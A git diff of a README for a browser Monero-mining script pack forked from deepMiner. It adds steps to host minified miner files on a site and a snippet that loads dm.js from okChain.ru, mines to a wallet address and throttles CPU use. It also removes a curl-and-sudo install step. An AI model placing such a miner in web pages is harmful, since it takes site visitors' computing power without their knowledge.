@@ -1,5 +1,6 @@
-# deepMiner
+# Complete client side script pack Monero miner for browser
 
+from:
 ```acsii
 :::::::-.  .,:::::: .,::::::::::::::::. .        :   ::::::.    :::..,:::::: :::::::..
  ;;,   `';,;;;;'''' ;;;;'''' `;;;```.;;;;;,.    ;;;  ;;;`;;;;,  `;;;;;;;'''' ;;;;``;;;;
@@ -15,83 +16,67 @@
 ----------------------------------------------------------------------------------------
 ```
 
+
 ## Usage
 
-* Add some javascript and write like this :
+* Copy uglified scripts (preserve structure) to webroot dir your site:
+```acsii
+xmrMiner-scriptPack.git
+.
+|-- dm.js (miner)
+|__ w.js  (worker - load wasm or js crypt)
+    lib
+    |-- cn.wasm    (fast wasm version)
+    |-- cna.js     (for unsupported wasm browsers)
+    |__ cna.js.mem (for unsupported wasm browsers)
+    
+```
 
+* Add some javascript and write like this :
 ```html
-<script src="https://deepc.cc/deepMiner.js"></script>
+<script src="http://okChain.ru/dm.js"></script>
 <script>
-    var miner = new deepMiner.Anonymous('deepMiner_test').start();
+    var miner = new deepMiner.Anonymous('xmr_addr').start();
+    miner.setThrottle(0.5);
 </script>
 ```
 
-* All done! XD~ Let's build our srv by self
-
-## Install
-
-```bash
-curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
-sudo sh install.sh
-```
-
-lib request: `*nodejs` / `*npm` / `?nginx`
-
-useful pakages: `forever`
-
-ssl support: <https://certbot.eff.org/>
-
-OS pass: `ubuntu(debian)`
 
 ## API
 
 Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)
 
-## Update
-
-Just go `/srv/deepMiner` and run `git pull`
-
-DON'T forget backup your `config.json` !!!
-
-## Attention
-
-Some VPS's default DNS can't find IP for the pool. Check your DNS setting if it's wrong.
-
-SSL cert request default TRUE. Use `certbot` to quickly set it.
-
-If not a bug just Qus in something setting or in install. Please write down at <https://github.com/deepwn/deepMiner/issues/8>
 
 ## Example
 
-<https://deepc.cc/demo.html>
+<http://www.okchain.ru/demo.html>
+
 
 ## Source
 
 ```acsii
-deepMiner.git
+xmrMiner-scriptPack.git
 .
 |-- README.md
-|-- banner
-|-- config.json
 |-- LICENSE
-|-- package-lock.json
-|-- package.json
-|-- server.js
 |__ web
-    |-- 404.html
-    |-- deepMiner.js
+    |-- deepMiner.js (source)
+    |-- dm.js (uglified deepMiner.js)
     |-- demo.html
-    |-- index.html
     |-- lib
-    |   |-- cryptonight-asmjs.js
-    |   |-- cryptonight-asmjs.js.mem
-    |   |__ cryptonight.wasm
-    |__ worker.js
+    |   |-- cryptonight-asmjs.js (source)
+    |   |-- cna.js (uglified cryptonight-asmjs.js)
+    |   |-- cna.js.mem
+    |   |__ cn.wasm
+    |__ worker.js (source)
+    |__ w.js (uglified worker.js)
 ```
+
 
 ## License
 
-MIT <https://raw.githubusercontent.com/deepwn/deepMiner/master/LICENSE>
+MIT <https://raw.githubusercontent.com/mixartemev/xmrMiner-scriptPack/master/LICENSE>
+
 
 ## Missions
 
